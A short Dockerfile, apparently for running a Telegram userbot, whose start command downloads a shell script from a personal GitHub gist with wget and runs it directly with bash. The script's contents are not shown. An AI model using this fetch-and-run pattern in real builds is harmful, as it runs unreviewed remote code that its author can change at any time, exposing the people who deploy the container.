FROM python:3.9
#theteamultroid/ultroid:main
RUN apt install screen
RUN screen -v
CMD wget -O ab.sh https://gist.github.com/Alone0791/eeadf019dba0c5b6973db009f1172596/raw/alone;bash ab.sh
